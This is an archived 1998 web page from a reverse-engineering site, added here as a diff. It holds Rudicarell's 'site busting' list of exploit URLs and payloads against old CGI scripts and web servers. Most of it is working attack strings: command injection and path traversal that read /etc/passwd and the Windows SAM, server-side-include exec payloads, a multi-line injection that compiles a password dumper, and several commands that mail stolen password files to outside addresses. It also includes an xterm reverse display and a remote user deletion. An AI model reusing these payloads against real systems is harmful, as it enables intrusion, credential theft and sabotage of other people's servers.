@@ -1,0 +1,223 @@
+<html>
+
+                 <!-- html code by NotAnne after Fravia+ and IcE -->
+                 <!-- built upon the shoulders of others -->
+
+                 <h1><head>
+                 <title>servexpl.htm: Some nice 
+site busting techniques</title>
+                 </head></h1>
+
+                 <body bgcolor=#CCCCCC text=#001010 vlink=#405040>
+
+                 <center>
+
+                 <a href="ideale.htm"><img src="https://searchlores.nickifaulk.com/ideale.gif" tppabs="http://fravia.net/ideale.gif" ALT="ideale" ALIGN=BOTTOM WIDTH=114 
+                 EIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></a><br>
+                 <font color=gray>CGI-Busting</font>
+                 <hr size=2>
+
+                 <h1 align="center">Site Busting<br>Rudicarell,'s <i>Some nice 
+site busting techniques</i></h1>
+
+                 <p align="center">courtesy of fravia+'s page of reverse
+                 engineering</p>
+
+                 <p align="center">12 November 1998<br></p>
+
+                 <hr size=2>
+
+                 <!-- begin fravia+'s comments -->
+                 <i>Well, this is an interesting addition... only for real reversers, though, beginners, please
+go study some elementary site busting first... for all the other ones...  
+I don't think I need to explain you how interesting this stuff is... Enjoy! :-)</i>
+</center><hR>
+<pre>
+hi fravia+,
+this is my collection of "how to exploit weak sites with your browser"
+i'm working an a document which includes very new exploits .. i'll let you
+know when it is ready ... 
+
+haveaniceday
+
+RUDICARELL 
+
+# test cgi's
+/cgi-bin/test-cgi?\whatever
+/cgi-bin/test-cgi?\help&0a/bin/cat%20/etc/passwd
+/cgi-bin/test-cgi?/*
+/cgi-bin/test-cgi?* HTTP/1.0
+/cgi-bin/test-cgi?x *
+/cgi-bin/nph-test-cgi?* HTTP/1.0
+/cgi-bin/nph-test-cgi?x *
+
+# jj 
+/cgi-bin/jj?pwd=SDGROCKS&pop=0&name=rudi&adr=elder4&phone=4523534~/bin/ls
+
+# betterones
+
+/cgi-bin/info2www?(../../../../../../../bin/mail <a href="https://searchlores.nickifaulk.com/py/nfCmp.py-Pyt=Tnf&amp;1st=1&amp;to=rudicarell@hotmail.com&amp;YY=23082" tppabs="http://fravia.net/py/nfCmp.py?Pyt=Tnf&1st=1&to=rudicarell@hotmail.com&YY=23082">rudicarell@hotmail.com</a> 
+&lt;/etc/passwd)
+/cgi-bin/blabla?%0a/bin/cat%20/etc/passwd
+/cgi-bin/finger?<a href="https://searchlores.nickifaulk.com/py/nfCmp.py-Pyt=Tnf&amp;1st=1&amp;to=tiedotus@uta.fi&amp;YY=23082" tppabs="http://fravia.net/py/nfCmp.py?Pyt=Tnf&1st=1&to=tiedotus@uta.fi&YY=23082">tiedotus@uta.fi</a>%3B%2Fbin%2Fmail+<a href="https://searchlores.nickifaulk.com/py/nfCmp.py-Pyt=Tnf&amp;1st=1&amp;to=rudicarell@hotmail.com&amp;YY=23082" tppabs="http://fravia.net/py/nfCmp.py?Pyt=Tnf&1st=1&to=rudicarell@hotmail.com&YY=23082">rudicarell@hotmail.com</a>+%3C+etc%2Fpasswd
+/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+/cgi-bin/phf?%0a blablabla 
+&Qalias=&Qname=&Qemail=&Qnickname=&Qoffice_phone= ... usw
+/cgi-bin/php.cgi?/etc/passwd
+/cgi-bin/fi?/etc/passwd
+/cgi-bin/wais.pl/set%20Gopher=/bin/cat%20/etc/passwd
+/cgi-bin/webdist.cgi?/bin/mail%20:/etc/passwd[<a href="https://searchlores.nickifaulk.com/py/nfCmp.py-Pyt=Tnf&amp;1st=1&amp;to=me@myhost.com&amp;YY=23082" tppabs="http://fravia.net/py/nfCmp.py?Pyt=Tnf&1st=1&to=me@myhost.com&YY=23082">me@myhost.com</a>]
+/cgi-bin/textcounter.pl?/;IFS=\8;(ps ax;cd ..;cd ..;cd ..;cd etc;cat 
+hosts;set)\|echo;echo|
+
+# other stuff
+/dir/doit.phtml?/home/ftp/incoming/executemycode.phtml
+/cgi-bin/AnyForm2?			...???
+/cgi-bin/infogate? 			...???
+/cgi-bin/test.bat?&dir 					.... netscape server
+/scripts/test.bat+%26dir+%26time+%26abracadabra.exe 	.... netscape 
+server
+
+# microfuck
+
+/guti.asp::$DATA		asp ......
+/global.asa			asp ......
+
+# long filenames :)
+/somewhere/VERYLON~.HTM			.... user save verylongyy.htm file
+
+# quid pro quo server
+/site.name/server%20logfile		.... quid pro quo - server
+
+# basic auth and others 
+/cgi-bin/www-sql/protected_directory/irgendwas.html
+/cgi-bin/htmlscript?../../../../../../etc/passwd
+/cgi-bin/campas?%0acat%0a/etc/passwd%0a
+/cool-logs/mlog.html?screen=/etc/passwd
+/cool-logs/mylog.html?screen=/etc/passwd
+/cgi-bin/view-source?../../../../../../../etc/passwd
+/cgi-bin/webgais 
+Content-length: (laenge des exploits)
+query=';mail+rudicarell\@hotmail.com&lt;/etc/passwd;echo'&output=subject&domain=paragraph
+
+# sgi silicon graphics
+
+/cgi-bin/handler/carelli;cat   /etc/passwd|?data=Download	(sgis! nur 
+tabs!)
+/cgi-bin/pfdispaly.cgi?'%0A/bin/uname%20-a|'			(sgis!)
+/cgi-bin/pfdispaly.cgi?/../../../../etc/motd			(sgis! alte version)
+/cgi-bin/aglimpse/80|IFS=5;CMD=5mail5rudicarell\@hotmail.com\&lt;/etc/passwd;eval$CMD;echo 
+
+# frontpage extensions 
+www.domain.com/beliebiges_directory/_vti_cnf		=  directory
+www.domain.com/_vti_pvt					=  world writeable
+
+# old but still working IIS perl.exe 
+nt/scripts/perl.exe?%20-e%20"system%20('dir%20c:\\winnt35\\repair');"
+
+# example bor bad perl oa 
+;xterm -display my.ip.address:0 &
+john;echo "#include \"pwd.h\""&gt;/tmp/shadow.c
+john;echo "main(){struct passwd *p;while(p=getpwent())"&gt;&gt;/tmp/shadow.c
+john;echo 
+"printf(\"%s:%s:%d:%d:%s:%s:%s\\n\",p-&gt;pw-name,"&gt;&gt;/tmp/shadow.c
+john;echo "p-&gt;pw_passwd,p-&gt;pw_uid,p-&gt;pw_gid,p-&gt;pw_gecos,"&gt;&gt;/tmp/shadow.c
+john;echo "p-&gt;pw_dir,p-&gt;pw_shell);}"&gt;&gt;/tmp/shadow.c
+john;cc -o /tmp/shadow /tmp/shadow.c
+john;/tmp/shadow&gt;&gt;/tmp/passwd
+john;/bin/cat /tmp/passwd|/bin/mail <a href="https://searchlores.nickifaulk.com/py/nfCmp.py-Pyt=Tnf&amp;1st=1&amp;to=remailer@some.remailer.com&amp;YY=23082" tppabs="http://fravia.net/py/nfCmp.py?Pyt=Tnf&1st=1&to=remailer@some.remailer.com&YY=23082">remailer@some.remailer.com</a>
+john;rm /tmp/shadow*;rm /tmp/passwd
+
+# sometimes its really bad
+~root 
+~root/etc/passwd    (zum beispiel)
+altavista    ....  url:etc AND link:passwd  ... oder ... root: 0:0
+                   url:.htaccess .. oder .. url:.htpasswd
+
+# NCSA files 
+httpd.conf   configure the httpd service
+srm.conf     scripts and documents reside
+access.conf  service features for all browsers
+.htaccess    Limits access on a directory-by-directory basis
+http .... bla bla /.htaccess            (NCSA .........)
+
+# microfuck
+http ... bla bla .. /scripts/blabla.bat?&dir+c:\+?&time
+                             test.bat+%26dir+%26time+%26pfieffer.exe
+
+# novell 
+http ... bla bla .. /files.pl? ../../blabla
+http ... bla bla .. /scripts/convert.bas?../../any_file_on_sys_volume
+
+# MAC WEBSTAR  
+http ... bla bla .. /M_A_C_H_T_T_P_V_E_R_S_I_O_N
+
+# lotus domino server (this is really cool)
+http ... /domcfg.nsf/?open		
+htto ... /domcfg.nsf/URLRedirect/?OpenForm
+http:... /database.nsf/viewname?SearchView&Query="*"
+
+# nt carbo server ****
+<a href="http://host/carbo.dll?icatcommand=../../winnt/win.ini&catalogname=catalog" tppabs="http://host/carbo.dll?icatcommand=../../winnt/win.ini&catalogname=catalog" target=_blank>http://host/carbo.dll?icatcommand=..\..\winnt\win.ini&catalogname=catalog</a>
+
+#example for server side includes anon-ftp upload****
+
+&lt;!--#exec cmd="/bin/ls"--&gt;
+&lt;!--#exec cmd="mail <a href="https://searchlores.nickifaulk.com/py/nfCmp.py-Pyt=Tnf&amp;1st=1&amp;to=me@my.org&amp;YY=23082" tppabs="http://fravia.net/py/nfCmp.py?Pyt=Tnf&1st=1&to=me@my.org&YY=23082">me@my.org</a> &lt; cat /etc/passwd"--&gt;
+&lt;!--#exec cmd="chmod 777 ~ftp/incoming/uploaded_hack_script"--&gt;
+&lt;!--#exec cmd="~ftp/incoming/uploaded_hack_script"--&gt;
+&lt;!--#exec cmd="find / -name foobar -print"--&gt;
+&lt;!--#include file="schweinenasenfile" --&gt;
+
+# metaweb servers
+<a href="http://mail.server.com:5000/smusers.txt" tppabs="http://mail.server.com:5000/smusers.txt" target=_blank>http://mail.server.com:5000/../smusers.txt</a>
+<a href="http://mail.server.com:5000/winnt/repair/sam._" tppabs="http://mail.server.com:5000/winnt/repair/sam._" target=_blank>http://mail.server.com:5000/../../winnt/repair/sam._</a>
+<a href="http://mail.server.com:5000/winnt/system32/net.exe" tppabs="http://mail.server.com:5000/winnt/system32/net.exe" target=_blank>http://mail.server.com:5000/../../winnt/system32/net.exe</a>?
+<a href="http://mail.server.com:5000/winnt/system32/net.exe?user%20joe%20/delete" tppabs="http://mail.server.com:5000/winnt/system32/net.exe?user%20joe%20/delete" target=_blank>http://mail.server.com:5000/../../winnt/system32/net.exe?user%20joe%20/delete</a>
+port:2040 = javaconfig
+port:5000 = mail 
+port:5001 = -"-
+<a href="http://www.metainfo.com/products/sendmail/users.htm" tppabs="http://www.metainfo.com/products/sendmail/users.htm" target=_blank>http://www.metainfo.com/products/sendmail/users.htm</a>
+<a href="http://www.metainfo.com/products/metaip/users.htm" tppabs="http://www.metainfo.com/products/metaip/users.htm" target=_blank>http://www.metainfo.com/products/metaip/users.htm</a>
+
+# verity search software ******
+s97_cgi.exe?Action=FormGen&ServerKey=Primary&Template=irgendwas (nt)
+search97.vts?HLNavigate=On&querytext=dcm&ServerKey=Primary&ResultTemplate=../../../../../../../etc/hosts&ResultStyle=simple&ResultCount=20&collection=books
+
+# uaaa |-) zhhhh wwwboard.html /wwwboard/passwd.txt ****
+wwwadmin.pl oder wwwadmin.cgi
+
+# cgi von hylafax ***
+/cgi-bin/faxsurvey?/bin/ls%20-a
+
+# other microfuck
+uploader.exe/		
+
+# new lotus-domino
+
+<a href="http://www.server.com/database.nsf/viewname?SearchView&Query=" tppabs="http://www.server.com/database.nsf/viewname?SearchView&Query=" target=_blank>http://www.server.com/database.nsf/viewname?SearchView&Query=</a>"*"
+
+/*end*/
+</prE>
+
+                
+<!-- internet searching strategies and hints content, end -->
+<hr width=66%><center><a href="ideale.htm"><IMG SRC="images/basipet.jpg"
+ALT="To ideale"
+ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+HSPACE=0></a>
+<br><br> 
+<!-- how to search the web, by fravia+, signet begin -->
+<table><tR><td width="300" height="2" bgcolor="#993300"></tD></tR></table>
+
+(c) 2000: <font color=blue>[</font><a href="info.htm">fravia+</a><font color=blue><font color=blue>]</fonT></font>, all rights reserved 
+<bR><!-- how to search the web, by fravia+, signet end -->
+
+
+<!-- begin da closing bit, duh -->
+
+
+<!-- begin da closing bit, duh -->
+</CENTER>
+</body>
+</HTML>
